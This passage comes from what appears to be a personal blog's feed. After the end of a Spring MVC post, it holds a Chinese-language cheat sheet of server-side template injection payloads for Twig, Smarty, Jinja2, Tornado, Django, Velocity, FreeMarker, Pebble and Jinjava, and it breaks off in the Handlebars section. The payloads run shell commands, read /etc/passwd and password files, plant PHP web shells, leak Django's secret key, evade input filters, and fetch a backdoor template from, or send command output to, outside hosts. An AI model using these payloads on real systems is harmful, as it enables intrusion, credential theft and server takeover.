class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button id=<span class="string">&quot;btn&quot;</span>&gt;发送ajax请求&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testAjax&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAjax</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testAjax 被执行了&quot;</span>);</span><br><span class="line">        System.out.println(body);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><p>后面这些不写了，，想写了再写</p><blockquote><p>  <a href="https://juejin.cn/post/6844904100107124749">Spring MVC 层层递进</a></p><p>  <a href="https://segmentfault.com/a/1190000022586808">SpringMVC参数绑定入门就这一篇</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近想看看java，不知道从哪开始，。。正好spring有最近不太平，就从spring MVC开始看吧。&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h1&gt;</summary>
      
    
    
    
    
    <category term="web,java" scheme="http://example.com/tags/web-java/"/>
    
  </entry>
  
  <entry>
    <title>SSTI payload记录</title>
    <link href="http://example.com/2022/03/29/SSTI/"/>
    <id>http://example.com/2022/03/29/SSTI/</id>
    <published>2022-03-28T16:00:00.000Z</published>
    <updated>2022-03-29T12:20:02.168Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2022/03/29/SSTI/1344396-20200911174631687-758048107.png" alt="img"></p><p>[toc]</p><h1 id="1-PHP中的ssti"><a href="#1-PHP中的ssti" class="headerlink" title="1.PHP中的ssti"></a>1.PHP中的ssti</h1><h2 id="Twig框架"><a href="#Twig框架" class="headerlink" title="Twig框架"></a>Twig框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;:输出</span><br><span class="line"></span><br><span class="line">&#123;# 注释 #&#125;:注释</span><br><span class="line"></span><br><span class="line">&#123;% %&#125;：逻辑运算</span><br><span class="line">循环：</span><br><span class="line">&#123;% for word in words %&#125;</span><br><span class="line">&#123;&#123; word &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试用payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">2</span>**<span class="number">3</span>&#125;&#125; = <span class="number">16</span></span><br><span class="line">&#123;<span class="comment"># 这里要注意的是，#要写成%23，不然会被浏览器当成锚点 #&#125;</span></span><br><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">2</span>**<span class="number">3</span>&#125;&#125;&#123;%<span class="number">23</span>%<span class="number">20</span>注释不会显示%<span class="number">20</span>%<span class="number">23</span>&#125; = <span class="number">16</span></span><br><span class="line">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125; = $&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line">&#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125; = <span class="number">49</span></span><br><span class="line">&#123;&#123;<span class="number">1</span>/<span class="number">0</span>&#125;&#125; = <span class="built_in">Error</span></span><br><span class="line">&#123;&#123;foobar&#125;&#125; Nothing</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># Get Info #&#125;</span></span><br><span class="line">&#123;&#123;_self&#125;&#125; <span class="comment">#(Ref. to current application)</span></span><br><span class="line">&#123;&#123;_self.env&#125;&#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(<span class="string">&#x27;,&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># File read #&#125;</span></span><br><span class="line"><span class="string">&quot;&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&quot;</span>@</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># Exec code #&#125;</span></span><br><span class="line">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attacker.net:2121&quot;</span>)&#125;&#125;&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoor&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;system&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class="line">&lt;<span class="comment">#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat /etc/passwd&quot;) &#125;</span></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat\x20/etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat$IFS/etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">全版本通用payload：</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Smarty框架"><a href="#Smarty框架" class="headerlink" title="Smarty框架"></a>Smarty框架</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件读</span></span><br><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br><span class="line"><span class="comment">//other</span></span><br><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;  <span class="comment">#获取smarty的版本号</span></span><br><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  <span class="comment">#执行相应的php代码，在Smarty3版本中已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span></span><br><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;    <span class="comment"># 执行相应的php代码</span></span><br><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125; <span class="comment"># 任意文件读取</span></span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125; <span class="comment"># 文件写入</span></span><br><span class="line">&#123;system(<span class="string">&#x27;ls&#x27;</span>)&#125; <span class="comment"># compatible v3</span></span><br><span class="line">&#123;system(<span class="string">&#x27;cat index.php&#x27;</span>)&#125; <span class="comment"># compatible v3</span></span><br><span class="line">&#123;literal&#125;alert(<span class="string">&#x27;xss&#x27;</span>);&#123;/literal&#125; <span class="comment"># XSS</span></span><br></pre></td></tr></table></figure><h1 id="2-python中的ssti"><a href="#2-python中的ssti" class="headerlink" title="2.python中的ssti"></a>2.python中的ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回示例所属的类</span><br><span class="line">__mro__    返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回一个类所继承的基类,返回字符串类型    <span class="comment"># __base__和__mro__都是用来寻找基类的</span></span><br><span class="line">__bases__  元组类型返回</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>通用的一些payload，版本不同排序不同</p><h2 id="0-通用"><a href="#0-通用" class="headerlink" title="0.通用"></a>0.通用</h2><h3 id="os-wrap-close中的popen-py2不行"><a href="#os-wrap-close中的popen-py2不行" class="headerlink" title="os._wrap_close中的popen(py2不行)"></a>os._wrap_close中的popen(py2不行)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">128</span>].__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h3 id="os中popen"><a href="#os中popen" class="headerlink" title="os中popen"></a>os中popen</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure><h3 id="import-中os-py2不行"><a href="#import-中os-py2不行" class="headerlink" title="__import__中os(py2不行)"></a><code>__import__</code>中os(py2不行)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="1-Jinjia2"><a href="#1-Jinjia2" class="headerlink" title="1.Jinjia2"></a>1.Jinjia2</h2><p>以Django的模板为模型的，是Flask框架的一部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values():</span><br><span class="line">            <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys():</span><br><span class="line">                    <span class="built_in">print</span>(b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>))</span><br></pre></td></tr></table></figure><p>以上payload转为jinjis2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>过滤<code>[</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;# getitem、pop #&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br><span class="line">&#123;&#123; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤``:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;# chr函数 #&#125;</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()&#125;&#125;#request对象</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line"></span><br><span class="line">&#123;# 命令执行 #&#125;</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure><p>过滤下划线：(使用<code>request.args</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>过滤花括号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#用&#123;%%&#125;标记</span><br><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;curl http://127.0.0.1:7999/?i=`whoami`&#x27;).read()==&#x27;p&#x27; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="2-tornado"><a href="#2-tornado" class="headerlink" title="2.tornado"></a>2.tornado</h2><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过<code>&#123;&#123;&#125;&#125;</code>进行传递变量和执行简单的表达式。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">import</span> foobar %&#125; = Error</span><br><span class="line">&#123;% <span class="keyword">import</span> os %&#125;&#123;&#123;os.system(<span class="string">&#x27;whoami&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Djanjo"><a href="#3-Djanjo" class="headerlink" title="3.Djanjo"></a>3.Djanjo</h2><p>这个比较难利用，条件被限制的很死，很难执行命令；但Django自带的应用 “admin”（也就是Django自带的后台）的<code>models.py</code>中导入了当前网站的配置文件，可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span></span><br><span class="line"><span class="xml">&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</span></span><br></pre></td></tr></table></figure><h1 id="3-Java中ssti"><a href="#3-Java中ssti" class="headerlink" title="3.Java中ssti"></a>3.Java中ssti</h1><h2 id="1-Velocity"><a href="#1-Velocity" class="headerlink" title="1.Velocity"></a>1.Velocity</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).waitFor()    // CVE-2019-3396</span><br><span class="line">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h2 id="2-FreeMarker"><a href="#2-FreeMarker" class="headerlink" title="2.FreeMarker"></a>2.FreeMarker</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">49</span> = <span class="number">49</span></span><br><span class="line">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125; = <span class="number">49</span></span><br><span class="line">#&#123;<span class="number">7</span>*<span class="number">7</span>&#125; = <span class="number">49</span> -- (legacy)</span><br><span class="line">$&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125; Nothing</span><br><span class="line">$&#123;foobar&#125;</span><br><span class="line"></span><br><span class="line">  &lt;#assign ex=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span> ?<span class="keyword">new</span>()=<span class="string">&quot;&quot;</span>&gt;$&#123; ex(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line">  [#assign ex = <span class="string">&#x27;freemarker.template.utility.Execute&#x27;</span>?<span class="keyword">new</span>()]$&#123; ex(<span class="string">&#x27;id&#x27;</span>)&#125;</span><br><span class="line">  $&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;id&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line">  $&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(<span class="string">&#x27;/home/carlos/my_password.txt&#x27;</span>).toURL().openStream().readAllBytes()?join(<span class="string">&quot; &quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h2 id="3-Spring-View-Manipulation"><a href="#3-Spring-View-Manipulation" class="headerlink" title="3.Spring View Manipulation"></a>3.Spring View Manipulation</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__$&#123;<span class="keyword">new</span> java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x</span><br><span class="line">__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;touch executed&quot;</span>)&#125;__::.x</span><br></pre></td></tr></table></figure><h2 id="4-Pebble"><a href="#4-Pebble" class="headerlink" title="4.Pebble"></a>4.Pebble</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test</span></span><br><span class="line">&#123;&#123; someString.toUPPERCASE() &#125;&#125;</span><br><span class="line"><span class="comment">//低版本</span></span><br><span class="line">&#123;&#123; variable.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().exec(<span class="string">&#x27;ls -la&#x27;</span>) &#125;&#125;</span><br><span class="line"><span class="comment">//高版本</span></span><br><span class="line">&#123;% set cmd = <span class="string">&#x27;id&#x27;</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">&#x27;java.lang.String&#x27;</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="5-Jinjava"><a href="#5-Jinjava" class="headerlink" title="5.Jinjava"></a>5.Jinjava</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.toUpperCase()&#125;&#125; = <span class="string">&#x27;A&#x27;</span></span><br><span class="line">&#123;&#123; request &#125;&#125; = 会返回一个request对象形如 com.[...].context.TemplateContextRequest@<span class="number">23548206</span></span><br><span class="line"><span class="comment">//RCE</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;a&#x27;</span>.getClass().forName(<span class="string">&#x27;javax.script.ScriptEngineManager&#x27;</span>).newInstance().getEngineByName(<span class="string">&#x27;JavaScript&#x27;</span>).eval(\<span class="string">&quot;new java.lang.String(&#x27;xxx&#x27;)\&quot;)&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#123;&#x27;a&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="4-Nodejs中的SSTI"><a href="#4-Nodejs中的SSTI" class="headerlink" title="4.Nodejs中的SSTI"></a>4.Nodejs中的SSTI</h1><h2 id="1-Handlebars"><a href="#1-Handlebars" class="headerlink" title="1.Handlebars"></a>1.Handlebars</h2><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;&#123;#<span class="name"><span class="builtin-name">with</span></span> <span 